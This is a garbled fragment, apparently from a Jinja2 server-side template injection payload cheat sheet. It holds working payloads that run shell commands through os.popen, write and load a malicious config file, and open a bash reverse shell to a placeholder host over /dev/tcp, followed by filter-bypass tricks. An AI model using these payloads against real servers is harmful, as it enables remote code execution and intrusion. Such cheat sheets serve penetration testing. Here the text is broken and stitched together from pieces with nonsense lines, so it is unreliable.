...
> .attc include c o d e  -exist or e n g i n e pager.c static file\runtime ["REPLACE"] -var {void} ["VALUE"] in HTML.pages
# Summary
* [Tools](#tools)
...
{{ namespace.__init__.__globals__.os.popen('id').read() }}
		```
			<br>
sourceURL:[@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
...
Exploit the SSTI by writing an evil config file evil.config{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}# load the evil config{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }};
	<?php```### Jinja2 - Filter bypass
request.__class__
request["__class__"]
Bypassing...`_`
...
Bypassing...('.','_','|join','[',']','mro' and 'base') By https://twitter.com/SecGus:
